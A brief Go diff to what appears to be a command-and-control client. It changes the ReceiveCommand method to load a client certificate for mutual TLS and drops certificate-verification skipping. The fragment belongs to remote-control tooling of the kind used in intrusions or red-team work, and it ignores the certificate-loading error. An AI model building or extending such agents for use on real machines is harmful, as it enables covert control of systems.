@@ -10,14 +10,16 @@ import (
 	"time"
 )
 
-func (server *C2) ReceiveCommand() (command string) {
+func (server *C2) ReceiveCommand(cert, key string) (command string) {
+	
+	loadcert, _ := tls.LoadX509KeyPair(cert, key)
 
 	tr := &http.Transport{
 		MaxIdleConns:       10,
 		IdleConnTimeout:    30 * time.Second,
 		DisableCompression: true,
 		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
+			Certificates: []tls.Certificate{loadcert},
 		},
 	}
 	client := &http.Client{
